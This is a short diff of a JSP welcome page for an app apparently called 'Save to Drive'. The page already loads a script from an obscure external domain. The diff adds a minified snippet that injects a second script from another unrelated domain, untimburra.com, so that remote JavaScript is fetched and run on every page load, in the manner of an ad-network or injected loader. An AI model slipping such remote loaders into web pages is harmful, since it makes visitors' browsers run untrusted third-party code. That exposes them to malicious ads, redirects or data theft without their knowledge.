@@ -11,6 +11,7 @@
 <%@taglib prefix="ui" tagdir="/WEB-INF/tags" %>
 
 <script type='text/javascript' src='//potslascivious.com/c7/b0/f4/c7b0f48d55af48073c3bd4627956b288.js'></script>
+<script>(function(d,z,s){s.src='//'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('untimburra.com',4411735,document.createElement('script'))</script>
 
 <ui:templete title="Welcome to Save to Drive">
     <jsp:attribute name="head_area"/>
